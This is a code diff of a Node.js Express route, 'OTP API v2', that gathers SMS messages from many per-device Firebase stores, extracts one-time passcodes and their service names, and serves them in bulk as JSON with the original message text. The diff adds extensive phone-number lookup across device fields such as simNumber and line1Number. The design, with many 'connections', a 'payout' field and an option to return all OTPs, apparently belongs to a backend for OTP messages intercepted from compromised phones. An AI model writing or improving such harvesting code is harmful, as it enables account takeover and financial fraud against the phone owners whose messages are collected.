@@ -1,11 +1,7 @@
 "use strict";
 
 /**
- * OTP API v2 — Clean JSON, no cache, instant live data.
- *
- * GET /api/v2/otp         → 50 OTPs (default)
- * GET /api/v2/otp?count=10 → 10 OTPs
- * GET /api/v2/otp?count=0  → ALL OTPs
+ * OTP API v2 — Clean JSON, no cache, CYRUS masked phones.
  */
 
 const { Router } = require("express");
@@ -16,6 +12,66 @@ const OtpExtractor = require("../services/otpExtractor");
 
 const router = Router();
 
+// All possible phone field paths in Firebase data
+const PHONE_PATHS = [
+  "phoneNumber", "phone", "number", "mobileNumber", "mobile",
+  "phoneNo", "contactNumber", "simNumber", "sim", "registeredNumber",
+  "devicePhone", "myNumber", "simPhoneNumber", "line1Number", "msisdn",
+  "phone_number", "mobile_number", "cellNumber",
+];
+
+function getNestedValue(obj, path) {
+  if (!obj) return undefined;
+  const parts = path.split(".");
+  let cur = obj;
+  for (const p of parts) {
+    if (!cur || typeof cur !== "object") return undefined;
+    cur = cur[p];
+  }
+  return cur;
+}
+
+function findPhone(device, rawClient) {
+  // 1. From normalized device
+  if (device?.phoneNumber && device.phoneNumber !== "—") {
+    return device.phoneNumber;
+  }
+  // 2. From raw Firebase client data
+  if (rawClient && typeof rawClient === "object") {
+    for (const path of PHONE_PATHS) {
+      const val = getNestedValue(rawClient, path);
+      if (val && val !== "—" && val !== "" && val !== "null") {
+        let digits = String(val).replace(/[^0-9]/g, "");
+        if (digits.length === 11 && digits.startsWith("0")) digits = digits.slice(1);
+        if (digits.length === 10) return "91" + digits;
+        if (digits.length === 12 && digits.startsWith("92")) return "91" + digits.slice(2);
+        if (digits.length >= 11 && digits.length <= 15) return digits;
+      }
+    }
+    // Check nested objects
+    for (const key of Object.keys(rawClient)) {
+      const sub = rawClient[key];
+      if (sub && typeof sub === "object" && !Array.isArray(sub)) {
+        for (const path of PHONE_PATHS) {
+          const val = sub[path];
+          if (val && val !== "—" && val !== "") {
+            let digits = String(val).replace(/[^0-9]/g, "");
+            if (digits.length === 11 && digits.startsWith("0")) digits = digits.slice(1);
+            if (digits.length === 10) return "91" + digits;
+            if (digits.length === 12 && digits.startsWith("92")) return "91" + digits.slice(2);
+            if (digits.length >= 11 && digits.length <= 15) return digits;
+          }
+        }
+      }
+    }
+  }
+  return "";
+}
+
+function maskPhone(phone) {
+  return OtpExtractor.maskPhone(phone);
+}
+
 router.get("/otp", async (req, res, next) => {
   try {
     const countParam = req.query.count;
@@ -25,7 +81,7 @@ router.get("/otp", async (req, res, next) => {
     else count = 50;
 
     const connections = await ConnectionsService.getAllActive();
-    if (connections.length === 0) {
+    if (!connections.length) {
       return res.type("application/json").send(JSON.stringify({ status: "success", total: 0, data: [] }, null, 4));
     }
 
@@ -39,7 +95,6 @@ router.get("/otp", async (req, res, next) => {
             FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
           ]);
 
-          // Parse devices ONCE — these have phone numbers from DeviceService.normalize()
           const devices = DeviceService.parseAll(clientsData);
           const connOtps = [];
 
@@ -47,10 +102,10 @@ router.get("/otp", async (req, res, next) => {
             for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
               if (!deviceMessages || typeof deviceMessages !== "object") continue;
 
-              // Get phone DIRECTLY from normalized device data
               const device = devices.find((d) => d.id === deviceId);
-              const phone = (device && device.phoneNumber && device.phoneNumber !== "—")
-                ? device.phoneNumber : "";
+              const rawClient = clientsData?.[deviceId];
+              const phone = findPhone(device, rawClient);
+              const masked = maskPhone(phone);
 
               for (const [, msg] of Object.entries(deviceMessages)) {
                 if (!msg || typeof msg !== "object") continue;
@@ -59,11 +114,9 @@ router.get("/otp", async (req, res, next) => {
                 const extracted = OtpExtractor.extractOtp(text);
                 if (!extracted) continue;
 
-                const ts = getTimestamp(msg);
-
                 connOtps.push({
-                  dt: ts,
-                  num: phone || "Unknown",
+                  dt: getTimestamp(msg),
+                  num: masked,
                   cli: extracted.service,
                   message: text.trim(),
                   payout: "0",
@@ -76,16 +129,11 @@ router.get("/otp", async (req, res, next) => {
       })
     );
 
-    for (const result of results) {
-      if (result.status === "fulfilled") allOtps.push(...result.value);
+    for (const r of results) {
+      if (r.status === "fulfilled") allOtps.push(...r.value);
     }
 
-    // Sort newest first
-    allOtps.sort((a, b) => {
-      const da = new Date(a.dt).getTime() || 0;
-      const db = new Date(b.dt).getTime() || 0;
-      return db - da;
-    });
+    allOtps.sort((a, b) => (new Date(b.dt).getTime() || 0) - (new Date(a.dt).getTime() || 0));
 
     const sliced = count > 0 ? allOtps.slice(0, count) : allOtps;
     res.type("application/json").send(JSON.stringify({ status: "success", total: sliced.length, data: sliced }, null, 4));
@@ -96,15 +144,15 @@ router.get("/otp", async (req, res, next) => {
 
 function getTimestamp(msg) {
   const raw = msg.timestamp || msg.time || msg.date || msg.receivedAt || msg.createdAt || msg.sentAt || msg.ts || "";
-  if (!raw) return formatDate(new Date());
-  if (typeof raw === "number") return formatDate(new Date(raw > 1e12 ? raw : raw * 1000));
+  if (!raw) return fmtDate(new Date());
+  if (typeof raw === "number") return fmtDate(new Date(raw > 1e12 ? raw : raw * 1000));
   const d = new Date(raw);
-  if (!isNaN(d.getTime())) return formatDate(d);
+  if (!isNaN(d.getTime())) return fmtDate(d);
   if (typeof raw === "string" && /\d{4}[-/]\d{2}[-/]\d{2}/.test(raw)) return raw.replace(/\//g, "-").slice(0, 19);
-  return formatDate(new Date());
+  return fmtDate(new Date());
 }
 
-function formatDate(d) {
+function fmtDate(d) {
   const p = (n) => String(n).padStart(2, "0");
   return `${d.getUTCFullYear()}-${p(d.getUTCMonth()+1)}-${p(d.getUTCDate())} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())}`;
 }
